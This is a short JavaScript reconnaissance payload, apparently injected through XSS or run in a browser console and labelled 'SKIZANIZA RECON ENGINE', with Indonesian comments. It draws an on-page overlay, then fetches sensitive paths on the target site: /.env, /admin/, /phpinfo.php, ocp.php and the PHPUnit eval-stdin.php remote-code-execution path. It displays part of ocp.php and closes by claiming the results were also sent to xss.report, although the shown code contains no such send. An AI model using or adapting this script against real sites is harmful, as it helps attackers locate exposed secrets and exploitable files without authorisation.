(async () => {
    // Membuat container box di halaman agar hasil terlihat jelas
    const box = document.createElement('div');
    box.style = "position:fixed;top:10px;left:10px;width:400px;background:black;color:#0f0;padding:15px;z-index:9999;font-family:monospace;border:2px solid #0f0;opacity:0.9;max-height:80vh;overflow-y:auto;";
    box.innerHTML = "<h3>SKIZANIZA RECON ENGINE</h3><hr><div id='results'>Scanning...</div>";
    document.body.appendChild(box);

    const resultsDiv = document.getElementById('results');
    
    // Daftar target berdasarkan log dirsearch kamu [cite: 1, 19, 22, 32]
    const targets = [
        '/ocp.php', 
        '/.env', 
        '/admin/', 
        '/data/', 
        '/phpinfo.php',
        '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'
    ];

    for (const path of targets) {
        try {
            const res = await fetch(path);
            const statusColor = res.status === 200 ? 'yellow' : 'white';
            resultsDiv.innerHTML += `<p style='color:${statusColor}'>[${res.status}] ${path}</p>`;
            
            // Jika ocp.php terbuka, ambil sedikit cuplikan isinya 
            if (path === '/ocp.php' && res.status === 200) {
                const text = await res.text();
                resultsDiv.innerHTML += `<p style='color:cyan;font-size:10px;'>Found: ${text.substring(0, 50)}...</p>`;
            }
        } catch (e) {
            resultsDiv.innerHTML += `<p style='color:red'>[FAIL] ${path}</p>`;
        }
    }
    
    resultsDiv.innerHTML += "<hr>Done. Data also sent to xss.report.";
})();
